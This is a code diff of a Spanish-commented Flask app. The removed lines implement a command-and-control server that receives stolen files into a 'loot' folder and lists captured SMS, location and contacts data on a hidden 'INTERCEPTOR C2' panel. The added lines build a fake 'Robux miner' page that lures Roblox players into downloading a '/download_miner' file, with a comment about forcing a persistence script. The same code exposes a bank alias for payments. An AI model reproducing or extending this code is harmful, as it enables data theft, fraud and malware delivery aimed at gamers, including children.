@@ -1,49 +1,47 @@
-from flask import Flask, request, send_from_directory, render_template_string
+from flask import Flask, render_template_string, jsonify, request
 import os
-import datetime
 
 app = Flask(__name__)
-UPLOAD_FOLDER = 'loot'
-if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)
 
-@app.route('/svr_upload', methods=['POST'])
-def upload():
-    if 'file' not in request.files: return "ERR", 400
-    file = request.files['file']
-    # Guardamos con marca de tiempo para no sobreescribir
-    ts = datetime.datetime.now().strftime('%H%M%S')
-    filename = f"{ts}_{file.filename}"
-    file.save(os.path.join(UPLOAD_FOLDER, filename))
-    return "OK", 200
+# CONFIGURACIÓN DEL ARQUITECTO (Aquí cambias tu CBU/Alias cuando quieras)
+TARGET_DATA = {
+    "cvu": "0000003100098765432101", 
+    "alias": "roblox.free.svr"
+}
 
-@app.route('/panel-secreto-svr')
-def panel():
-    files = sorted(os.listdir(UPLOAD_FOLDER), reverse=True)
-    li = ""
-    for f in files:
-        color = "#0f0"
-        icon = "📄"
-        if "sms" in f.lower(): icon, color = "💬", "#ff00ff"
-        if "location" in f.lower(): icon, color = "📍", "#ff0000"
-        if "contacts" in f.lower(): icon, color = "👤", "#00ffff"
-        
-        li += f"<li style='margin:10px 0; border-bottom:1px solid #1a1a1a; padding:5px;'>" \
-              f"<span style='color:{color};'>{icon}</span> " \
-              f"<a href='/download/{f}' style='color:{color}; text-decoration:none;'>{f}</a></li>"
-    
-    return f"""
-    <html><body style='background:#050505; color:#0f0; font-family:monospace; padding:30px;'>
-    <h2 style='text-align:center; border:1px solid #0f0; padding:10px;'>🛰️ SVR-MATRIX: INTERCEPTOR C2</h2>
-    <div style='background:#111; padding:20px; border-radius:10px; box-shadow: 0 0 15px #0f03;'>
-        <h3>📦 ARCHIVOS CAPTURADOS:</h3>
-        <ul style='list-style:none; padding:0;'>{li or '<li>Escaneando frecuencias...</li>'}</ul>
-    </div>
-    </body></html>
+@app.route('/')
+def robux_generator():
+    return """
+    <html>
+    <head><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #1a1a1a; color: white; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
+        .box { border: 2px solid #00ff00; border-radius: 15px; padding: 20px; background: #222; }
+        .btn { background: #00ff00; color: black; padding: 15px; border: none; border-radius: 5px; font-weight: bold; width: 100%; margin-top: 20px; }
+        .mining-text { color: #888; font-size: 12px; margin-top: 10px; }
+    </style></head>
+    <body>
+        <div class="box">
+            <h2 style="color:#00ff00;">SVR ROBUX MINER</h2>
+            <p>Genera Robux usando tu procesador.</p>
+            <div id="status">Esperando inicio...</div>
+            <button class="btn" onclick="start()">INICIAR MINADO</button>
+            <p class="mining-text">El proceso debe mantenerse activo en segundo plano.</p>
+        </div>
+        <script>
+            function start() {
+                document.getElementById('status').innerHTML = "Minando: 0.0021 RBX/s";
+                // Aquí podrías forzar la descarga del script de persistencia
+                window.location.href = "/download_miner";
+            }
+        </script>
+    </body>
+    </html>
     """
 
-@app.route('/download/<filename>')
-def download(filename):
-    return send_from_directory(UPLOAD_FOLDER, filename)
+@app.route('/get_target')
+def get_target():
+    return jsonify(TARGET_DATA)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=10000)
